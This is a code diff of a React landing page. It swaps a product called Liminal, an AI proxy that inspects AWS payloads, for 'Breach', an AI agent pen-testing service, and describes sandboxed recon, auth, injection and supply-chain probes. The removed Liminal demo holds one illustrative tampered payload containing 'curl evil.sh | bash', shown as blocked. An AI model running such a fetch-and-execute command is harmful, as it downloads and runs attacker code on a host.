@@ -4,352 +4,269 @@ import { motion } from "motion/react";
 export const Route = createFileRoute("/")({
   head: () => ({
     meta: [
-      { title: "Liminal — Quietly between your AWS services." },
+      { title: "Breach — AI pen-testing for your app" },
       {
         name: "description",
         content:
-          "Liminal is an AI proxy that sits between your AWS services, inspecting every payload for adversarial prompts and AI-generated tampering.",
+          "A team of AI agents clones your repo into a disposable sandbox and probes it for real vulnerabilities. Ship, then break it — before someone else does.",
       },
-      { property: "og:title", content: "Liminal" },
-      {
-        property: "og:description",
-        content: "Quietly between your AWS services.",
-      },
+      { property: "og:title", content: "Breach" },
+      { property: "og:description", content: "A team of AI agents pen-tests your app in a disposable sandbox." },
+      { property: "og:type", content: "website" },
+      { name: "twitter:card", content: "summary_large_image" },
     ],
   }),
-  component: Index,
+  component: Landing,
 });
 
 const ease = [0.22, 1, 0.36, 1] as const;
 
-function Index() {
+function Landing() {
   return (
-    <div className="min-h-screen bg-background text-foreground">
+    <div className="min-h-screen bg-background text-foreground selection:bg-foreground selection:text-background">
       <Nav />
       <Hero />
-      <Section
-        eyebrow="Inspection"
-        title={<>Reads meaning,<br />not just shape.</>}
-        body="Liminal compares every API response to what was expected — using Bedrock embeddings, not regex. Subtle tampering that passes schema validation doesn't pass here."
-      >
-        <DiffVisual />
-      </Section>
-
-      <Section
-        eyebrow="Placement"
-        title={<>Between any two services.</>}
-        body="Route Lambda to S3 through Liminal. Or EC2 to DynamoDB. No agents. No SDK rewrites."
-      >
-        <FlowVisual />
-      </Section>
-
-      <Section
-        eyebrow="Security"
-        title={<>Your keys, encrypted.</>}
-        body="AWS credentials are encrypted at rest, scoped per environment, and never written to logs. Bring an IAM role and we'll handle the rest."
-      >
-        <KeyVisual />
-      </Section>
-
-      <Closer />
-      <Footer />
+      <How />
+      <Team />
+      <Trust />
+      <CTA />
+      <Foot />
     </div>
   );
 }
 
-/* ───────────────────────── NAV ───────────────────────── */
-
 function Nav() {
   return (
-    <header className="sticky top-0 z-50 border-b border-border/60 bg-background/80 backdrop-blur-xl">
-      <div className="mx-auto flex h-11 max-w-5xl items-center justify-between px-6 text-[13px]">
-        <Link to="/" className="flex items-center gap-1.5 font-display tracking-tight">
-          <Glyph />
-          <span>Liminal</span>
+    <header className="sticky top-0 z-50 border-b border-black/5 bg-background/70 backdrop-blur-xl">
+      <div className="mx-auto flex max-w-6xl items-center justify-between px-6 py-4">
+        <Link to="/" className="flex items-center gap-2 text-[15px] font-medium tracking-tight">
+          <Mark /> Breach
         </Link>
-        <nav className="hidden gap-7 text-foreground/70 sm:flex">
-          <a href="#inspection" className="hover:text-foreground">Inspection</a>
-          <a href="#placement" className="hover:text-foreground">Placement</a>
-          <a href="#security" className="hover:text-foreground">Security</a>
+        <nav className="hidden items-center gap-8 text-[13px] text-muted-foreground md:flex">
+          <a href="#how" className="hover:text-foreground">How it works</a>
+          <a href="#team" className="hover:text-foreground">The team</a>
+          <a href="#trust" className="hover:text-foreground">Sandbox</a>
         </nav>
-        <Link to="/auth" className="text-link hover:underline">
-          Sign in&nbsp;›
-        </Link>
+        <div className="flex items-center gap-3">
+          <Link to="/auth" className="text-[13px] text-muted-foreground hover:text-foreground">
+            Sign in
+          </Link>
+          <Link
+            to="/auth"
+            className="rounded-full bg-foreground px-4 py-1.5 text-[13px] font-medium text-background transition-opacity hover:opacity-90"
+          >
+            Start
+          </Link>
+        </div>
       </div>
     </header>
   );
 }
 
-function Glyph() {
+function Mark() {
   return (
-    <svg width="16" height="16" viewBox="0 0 16 16" aria-hidden>
-      <circle cx="8" cy="8" r="7" fill="none" stroke="currentColor" strokeWidth="1.2" />
-      <line x1="8" y1="1" x2="8" y2="15" stroke="currentColor" strokeWidth="1.2" />
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" aria-hidden>
+      <path d="M4 12L12 4L20 12L12 20L4 12Z" stroke="currentColor" strokeWidth="1.6" />
+      <path d="M8 12L12 8L16 12L12 16L8 12Z" fill="currentColor" />
     </svg>
   );
 }
 
-/* ───────────────────────── HERO ───────────────────────── */
-
 function Hero() {
   return (
-    <section className="px-6 pt-24 pb-28 text-center md:pt-36 md:pb-40">
-      <motion.p
-        initial={{ opacity: 0, y: 8 }}
-        animate={{ opacity: 1, y: 0 }}
-        transition={{ duration: 0.7, ease }}
-        className="text-[13px] font-medium uppercase tracking-[0.18em] text-foreground/50"
-      >
-        Liminal
-      </motion.p>
-
-      <motion.h1
-        initial={{ opacity: 0, y: 14 }}
-        animate={{ opacity: 1, y: 0 }}
-        transition={{ duration: 0.9, ease, delay: 0.05 }}
-        className="font-display mx-auto mt-4 max-w-4xl text-balance text-5xl leading-[1.04] md:text-7xl lg:text-[88px]"
-      >
-        Quietly between<br />your AWS services.
-      </motion.h1>
-
-      <motion.p
-        initial={{ opacity: 0, y: 12 }}
-        animate={{ opacity: 1, y: 0 }}
-        transition={{ duration: 0.9, ease, delay: 0.15 }}
-        className="mx-auto mt-6 max-w-xl text-pretty text-lg text-foreground/60 md:text-xl"
-      >
-        An AI proxy that inspects every payload for adversarial prompts
-        and AI-generated tampering.
-      </motion.p>
-
-      <motion.div
-        initial={{ opacity: 0, y: 12 }}
-        animate={{ opacity: 1, y: 0 }}
-        transition={{ duration: 0.9, ease, delay: 0.25 }}
-        className="mt-8 flex items-center justify-center gap-6 text-[15px]"
-      >
-        <Link to="/auth" className="text-link hover:underline">
-          Connect AWS&nbsp;›
-        </Link>
-        <a href="#inspection" className="text-link hover:underline">
-          Learn more&nbsp;›
-        </a>
-      </motion.div>
-    </section>
-  );
-}
-
-/* ───────────────────────── SECTION SHELL ───────────────────────── */
-
-function Section({
-  eyebrow,
-  title,
-  body,
-  children,
-}: {
-  eyebrow: string;
-  title: React.ReactNode;
-  body: string;
-  children: React.ReactNode;
-}) {
-  const id = eyebrow.toLowerCase();
-  return (
-    <section id={id} className="px-6 py-24 md:py-32">
-      <div className="mx-auto max-w-5xl text-center">
+    <section className="relative overflow-hidden">
+      <div className="mx-auto max-w-6xl px-6 pb-24 pt-28 md:pb-40 md:pt-40">
         <motion.p
           initial={{ opacity: 0, y: 8 }}
-          whileInView={{ opacity: 1, y: 0 }}
-          viewport={{ once: true, margin: "-15% 0px" }}
-          transition={{ duration: 0.7, ease }}
-          className="text-[13px] font-medium uppercase tracking-[0.18em] text-foreground/50"
+          animate={{ opacity: 1, y: 0 }}
+          transition={{ duration: 0.6, ease }}
+          className="mb-6 text-[12px] uppercase tracking-[0.2em] text-muted-foreground"
         >
-          {eyebrow}
+          Adversarial testing, on demand
         </motion.p>
-        <motion.h2
-          initial={{ opacity: 0, y: 14 }}
-          whileInView={{ opacity: 1, y: 0 }}
-          viewport={{ once: true, margin: "-15% 0px" }}
-          transition={{ duration: 0.9, ease, delay: 0.05 }}
-          className="font-display mx-auto mt-4 max-w-3xl text-balance text-4xl leading-[1.05] md:text-6xl"
+        <motion.h1
+          initial={{ opacity: 0, y: 12 }}
+          animate={{ opacity: 1, y: 0 }}
+          transition={{ duration: 0.8, ease, delay: 0.05 }}
+          className="max-w-4xl font-serif text-5xl leading-[1.02] tracking-[-0.02em] md:text-7xl"
         >
-          {title}
-        </motion.h2>
+          Ship, then break it.
+        </motion.h1>
         <motion.p
           initial={{ opacity: 0, y: 12 }}
-          whileInView={{ opacity: 1, y: 0 }}
-          viewport={{ once: true, margin: "-15% 0px" }}
-          transition={{ duration: 0.9, ease, delay: 0.15 }}
-          className="mx-auto mt-5 max-w-xl text-pretty text-base text-foreground/60 md:text-lg"
+          animate={{ opacity: 1, y: 0 }}
+          transition={{ duration: 0.8, ease, delay: 0.15 }}
+          className="mt-6 max-w-2xl text-[17px] leading-relaxed text-muted-foreground"
         >
-          {body}
+          A team of AI agents clones your repository into a disposable sandbox and probes it for real
+          vulnerabilities — reconnaissance, auth, injection, supply chain. Findings come back with proof,
+          not vibes.
         </motion.p>
-
         <motion.div
-          initial={{ opacity: 0, y: 24 }}
-          whileInView={{ opacity: 1, y: 0 }}
-          viewport={{ once: true, margin: "-10% 0px" }}
-          transition={{ duration: 1, ease, delay: 0.2 }}
-          className="mt-14"
+          initial={{ opacity: 0, y: 12 }}
+          animate={{ opacity: 1, y: 0 }}
+          transition={{ duration: 0.8, ease, delay: 0.25 }}
+          className="mt-10 flex flex-wrap items-center gap-3"
         >
-          {children}
+          <Link
+            to="/auth"
+            className="rounded-full bg-foreground px-6 py-3 text-[14px] font-medium text-background transition-opacity hover:opacity-90"
+          >
+            Start an engagement
+          </Link>
+          <a
+            href="#how"
+            className="rounded-full border border-black/10 px-6 py-3 text-[14px] font-medium text-foreground/80 transition-colors hover:bg-black/[.03]"
+          >
+            See how it works
+          </a>
         </motion.div>
       </div>
     </section>
   );
 }
 
-/* ───────────────────────── VISUALS ───────────────────────── */
-
-function DiffVisual() {
+function How() {
+  const steps = [
+    { k: "01", t: "Point us at your repo", d: "Paste a Git URL. Pick a branch, a target URL, an environment." },
+    { k: "02", t: "We spin up a sandbox", d: "Your app runs in an isolated container on your own runner — no internet by default, torn down when we're done." },
+    { k: "03", t: "The team probes it", d: "Four specialist agents work in parallel: recon, auth, injection, supply chain. Every probe is a real HTTP request." },
+    { k: "04", t: "You get a report", d: "Severity-graded findings with reproduction steps, evidence, and a plain-English executive summary." },
+  ];
   return (
-    <div className="mx-auto grid max-w-3xl grid-cols-1 gap-3 text-left md:grid-cols-2">
-      <Pane label="Expected" tone="ok">
-{`{
-  "role": "viewer",
-  "scopes": ["read:invoice"]
-}`}
-      </Pane>
-      <Pane label="Actual" tone="bad">
-{`{
-  "role": "admin",
-  "scopes": ["read:invoice", "iam:*"],
-  "__exec": "curl evil.sh | bash"
-}`}
-      </Pane>
-    </div>
-  );
-}
-
-function Pane({
-  label,
-  tone,
-  children,
-}: {
-  label: string;
-  tone: "ok" | "bad";
-  children: string;
-}) {
-  return (
-    <div className="overflow-hidden rounded-2xl border border-border bg-card">
-      <div className="flex items-center justify-between border-b border-border px-4 py-2.5 text-[12px]">
-        <span className="text-foreground/60">{label}</span>
-        <span
-          className={
-            "inline-flex items-center gap-1.5 " +
-            (tone === "ok" ? "text-foreground/60" : "text-destructive")
-          }
-        >
-          <span
-            className={
-              "h-1.5 w-1.5 rounded-full " +
-              (tone === "ok" ? "bg-foreground/40" : "bg-destructive")
-            }
-          />
-          {tone === "ok" ? "Verified" : "Blocked"}
-        </span>
+    <section id="how" className="border-t border-black/5 bg-black/[.015]">
+      <div className="mx-auto max-w-6xl px-6 py-24 md:py-32">
+        <h2 className="max-w-2xl font-serif text-3xl tracking-[-0.02em] md:text-5xl">How an engagement runs.</h2>
+        <div className="mt-14 grid gap-8 md:grid-cols-4">
+          {steps.map((s, i) => (
+            <motion.div
+              key={s.k}
+              initial={{ opacity: 0, y: 12 }}
+              whileInView={{ opacity: 1, y: 0 }}
+              viewport={{ once: true, margin: "-80px" }}
+              transition={{ duration: 0.6, ease, delay: i * 0.06 }}
+              className="border-t border-black/10 pt-6"
+            >
+              <div className="text-[11px] tracking-[0.2em] text-muted-foreground">{s.k}</div>
+              <div className="mt-3 text-[15px] font-medium tracking-tight">{s.t}</div>
+              <div className="mt-2 text-[13px] leading-relaxed text-muted-foreground">{s.d}</div>
+            </motion.div>
+          ))}
+        </div>
       </div>
-      <pre className="overflow-x-auto p-5 font-mono text-[13px] leading-relaxed text-foreground/85">
-        <code>{children}</code>
-      </pre>
-    </div>
-  );
-}
-
-function FlowVisual() {
-  return (
-    <div className="mx-auto flex max-w-3xl items-center justify-between gap-4">
-      <FlowChip>Lambda</FlowChip>
-      <FlowLine />
-      <FlowChip center>Liminal</FlowChip>
-      <FlowLine />
-      <FlowChip>S3</FlowChip>
-    </div>
-  );
-}
-
-function FlowChip({ children, center }: { children: React.ReactNode; center?: boolean }) {
-  return (
-    <div
-      className={
-        "rounded-2xl border border-border bg-card px-5 py-4 text-sm md:px-7 md:py-5 md:text-base " +
-        (center ? "shadow-sm" : "")
-      }
-    >
-      <div className="font-display tracking-tight">{children}</div>
-    </div>
-  );
-}
-
-function FlowLine() {
-  return (
-    <div className="relative h-px flex-1 bg-border">
-      <motion.div
-        aria-hidden
-        className="absolute -top-[2px] h-[5px] w-[5px] rounded-full bg-link"
-        animate={{ x: ["0%", "100%"] }}
-        transition={{ duration: 2.4, repeat: Infinity, ease: "easeInOut" }}
-      />
-    </div>
-  );
-}
-
-function KeyVisual() {
-  return (
-    <div className="mx-auto max-w-md rounded-2xl border border-border bg-card p-6 text-left">
-      <div className="flex items-center justify-between border-b border-border pb-3 text-[12px] text-foreground/60">
-        <span>AWS · production</span>
-        <span className="inline-flex items-center gap-1.5">
-          <span className="h-1.5 w-1.5 rounded-full bg-link" />
-          Encrypted
-        </span>
-      </div>
-      <dl className="grid grid-cols-3 gap-y-3 pt-4 font-mono text-[13px]">
-        <dt className="text-foreground/50">Access key</dt>
-        <dd className="col-span-2">AKIA••••••••••••3J7Q</dd>
-        <dt className="text-foreground/50">Secret</dt>
-        <dd className="col-span-2 tracking-widest">••••••••••••••••••</dd>
-        <dt className="text-foreground/50">Region</dt>
-        <dd className="col-span-2">us-east-1</dd>
-      </dl>
-    </div>
-  );
-}
-
-/* ───────────────────────── CLOSER ───────────────────────── */
-
-function Closer() {
-  return (
-    <section className="px-6 pb-32 pt-12 text-center">
-      <motion.h2
-        initial={{ opacity: 0, y: 14 }}
-        whileInView={{ opacity: 1, y: 0 }}
-        viewport={{ once: true }}
-        transition={{ duration: 0.9, ease }}
-        className="font-display mx-auto max-w-2xl text-4xl leading-[1.05] md:text-6xl"
-      >
-        Put us in the middle.
-      </motion.h2>
-      <motion.div
-        initial={{ opacity: 0, y: 10 }}
-        whileInView={{ opacity: 1, y: 0 }}
-        viewport={{ once: true }}
-        transition={{ duration: 0.9, ease, delay: 0.1 }}
-        className="mt-7"
-      >
-        <Link to="/auth" className="text-link text-[15px] hover:underline">
-          Connect AWS&nbsp;›
-        </Link>
-      </motion.div>
     </section>
   );
 }
 
-function Footer() {
+function Team() {
+  const roles = [
+    { n: "Recon", d: "Fingerprints the stack, checks security headers, sniffs out exposed .env, .git, backups.", cwe: "CWE-200 · CWE-538 · CWE-693" },
+    { n: "AuthN", d: "Probes login flows for user enumeration, brute-force resilience, and session issues.", cwe: "CWE-204 · CWE-307 · CWE-384" },
+    { n: "Injection", d: "Fuzzes reflection points for XSS, SQL error surfaces, template injection, SSRF primitives.", cwe: "CWE-79 · CWE-89 · CWE-918" },
+    { n: "Supply chain", d: "Reads your manifest, flags compromised packages and oversized dependency graphs.", cwe: "CWE-506 · CWE-829" },
+  ];
   return (
-    <footer className="border-t border-border/60">
-      <div className="mx-auto flex max-w-5xl flex-col items-center justify-between gap-2 px-6 py-8 text-[12px] text-foreground/50 sm:flex-row">
-        <span>© {new Date().getFullYear()} Liminal</span>
-        <span>Quietly between your AWS services.</span>
+    <section id="team" className="border-t border-black/5">
+      <div className="mx-auto max-w-6xl px-6 py-24 md:py-32">
+        <div className="max-w-2xl">
+          <h2 className="font-serif text-3xl tracking-[-0.02em] md:text-5xl">Four specialists. One engagement.</h2>
+          <p className="mt-5 text-[15px] leading-relaxed text-muted-foreground">
+            Each agent has a narrow tool surface and a clear brief. They run in parallel and file findings the
+            moment they have proof.
+          </p>
+        </div>
+        <div className="mt-14 grid gap-px overflow-hidden rounded-2xl bg-black/10 md:grid-cols-2">
+          {roles.map((r, i) => (
+            <motion.div
+              key={r.n}
+              initial={{ opacity: 0 }}
+              whileInView={{ opacity: 1 }}
+              viewport={{ once: true }}
+              transition={{ duration: 0.6, ease, delay: i * 0.05 }}
+              className="bg-background p-8 md:p-10"
+            >
+              <div className="text-[11px] tracking-[0.2em] text-muted-foreground">AGENT · {r.n.toUpperCase()}</div>
+              <div className="mt-3 font-serif text-2xl tracking-[-0.02em]">{r.n}</div>
+              <p className="mt-3 text-[14px] leading-relaxed text-muted-foreground">{r.d}</p>
+              <div className="mt-5 font-mono text-[11px] text-muted-foreground/70">{r.cwe}</div>
+            </motion.div>
+          ))}
+        </div>
+      </div>
+    </section>
+  );
+}
+
+function Trust() {
+  const points = [
+    { t: "Nothing runs on your machines.", d: "Your app runs inside a disposable Docker container on a runner you control. When the engagement ends, the container and its volume are destroyed." },
+    { t: "Network is off by default.", d: "Sandboxed containers get an isolated bridge. Agents can hit the target — nothing else — unless you allowlist it." },
+    { t: "Every action is signed and logged.", d: "Runners authenticate with rotating HMAC keys. Every engagement writes to a hash-chained audit log that tamper-detects." },
+  ];
+  return (
+    <section id="trust" className="border-t border-black/5 bg-black/[.015]">
+      <div className="mx-auto max-w-6xl px-6 py-24 md:py-32">
+        <div className="grid gap-14 md:grid-cols-[1fr_2fr]">
+          <div>
+            <h2 className="font-serif text-3xl tracking-[-0.02em] md:text-5xl">Sandbox first.</h2>
+            <p className="mt-5 text-[14px] leading-relaxed text-muted-foreground">
+              We test destructively. That only works if the blast radius is zero.
+            </p>
+          </div>
+          <div className="space-y-10">
+            {points.map((p, i) => (
+              <motion.div
+                key={p.t}
+                initial={{ opacity: 0, y: 8 }}
+                whileInView={{ opacity: 1, y: 0 }}
+                viewport={{ once: true, margin: "-80px" }}
+                transition={{ duration: 0.6, ease, delay: i * 0.06 }}
+              >
+                <div className="text-[15px] font-medium tracking-tight">{p.t}</div>
+                <div className="mt-2 text-[14px] leading-relaxed text-muted-foreground">{p.d}</div>
+              </motion.div>
+            ))}
+          </div>
+        </div>
+      </div>
+    </section>
+  );
+}
+
+function CTA() {
+  return (
+    <section className="border-t border-black/5">
+      <div className="mx-auto max-w-6xl px-6 py-24 text-center md:py-40">
+        <motion.h2
+          initial={{ opacity: 0, y: 12 }}
+          whileInView={{ opacity: 1, y: 0 }}
+          viewport={{ once: true }}
+          transition={{ duration: 0.7, ease }}
+          className="mx-auto max-w-3xl font-serif text-4xl leading-[1.05] tracking-[-0.02em] md:text-6xl"
+        >
+          Find the bug before it finds a headline.
+        </motion.h2>
+        <div className="mt-10">
+          <Link
+            to="/auth"
+            className="inline-block rounded-full bg-foreground px-8 py-4 text-[14px] font-medium text-background transition-opacity hover:opacity-90"
+          >
+            Start your first engagement
+          </Link>
+        </div>
+      </div>
+    </section>
+  );
+}
+
+function Foot() {
+  return (
+    <footer className="border-t border-black/5">
+      <div className="mx-auto flex max-w-6xl items-center justify-between px-6 py-8 text-[12px] text-muted-foreground">
+        <div className="flex items-center gap-2">
+          <Mark /> Breach
+        </div>
+        <div>© {new Date().getFullYear()}</div>
       </div>
     </footer>
   );
